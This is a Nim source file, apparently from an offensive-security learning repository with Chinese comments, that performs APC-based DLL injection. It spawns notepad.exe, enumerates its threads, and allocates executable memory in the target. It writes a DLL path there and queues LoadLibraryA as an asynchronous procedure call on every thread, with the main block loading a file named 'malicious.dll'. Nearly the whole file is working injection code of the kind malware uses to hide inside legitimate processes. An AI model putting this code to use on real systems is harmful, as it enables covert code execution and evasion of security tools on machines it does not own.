import winim/lean 
import osproc
import ./findallthreads_cpplike

var threadsArray {.noInit.}: seq[DWORD]
const
    MEM_RESERVE = 0x2000
    MEM_COMMIT = 0x1000

proc findAllThreads(PID: DWORD, size: BOOL): DWORD {.header: "findallthreads.h", importcpp: "$1(@)".}

# GetAllThreadsAsArray寻找所有关联线程id并将其放入nim的数组中，findAllThreads是对cpp的调用
proc GetAllThreadsAsArray(PID: DWORD): void =
  let ThreadsNum = findAllThreads(PID, false)
  echo "[*] This process has associate with ", cast[int](ThreadsNum), " threads. "
  for i in 1..cast[int](ThreadsNum):
    threadsArray.add(findAllThreads(PID, true))
    #echo "[*] Thread", i, ": ", thread

proc injectAPC(dllPath: string): void = 
  let newProcess = startProcess("notepad.exe");
  #newProcess.suspend() # 解除注释后notepad弹窗就会消失
  defer: newProcess.close()
  echo "[*] Injecting: ", dllPath
  echo "[*] Target Process: ", newProcess.processID
  Sleep(500)

  GetAllThreadsAsArray(cast[DWORD](newProcess.processID))
  echo ""
  
  let procHandle = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    cast[DWORD](newProcess.processID)
  )
  defer: CloseHandle(procHandle)
  echo "[*] pHandle: ", procHandle

  let dwSize = cast[SIZE_T](dllPath.len)
  let pDllAddr = VirtualAllocEx(
    procHandle,
    NULL,
    dwSize,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READ_WRITE
  )

  var bytesWritten: SIZE_T 
  let wSuccess = WriteProcessMemory(
    procHandle,
    pDllAddr,
    dllPath.cstring,
    dwSize,
    addr bytesWritten
  )
  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  let pFuncProcAddr = LoadLibraryA
  echo "[*] Find kernel32 addr: ", if NULL == pFuncProcAddr: false else: true
  echo ""

  echo "[*] Now insert APC object for every thread ... "
  var hThread: HANDLE
  # 对所有的线程插入APC
  for i in threadsArray:
    hThread = ERROR_INVALID_HANDLE
    hThread = OpenThread(
      THREAD_ALL_ACCESS,
      false,
      cast[DWORD](i)
    )
    if (hThread != ERROR_INVALID_HANDLE):
      echo "[*] Thread handle: ", i
      QueueUserAPC(cast[PAPCFUNC](pFuncProcAddr), hThread, cast[ULONG_PTR](pDllAddr))
      CloseHandle(hThread)
  echo "[+] APC injection finished! "
  
when isMainModule:
  var file = "C:/users/user/desktop/malicious.dll"
  injectAPC(file)

# nim cpp -r proc_inj_APC.nim
## This code is ugly, because I use undesired tricks.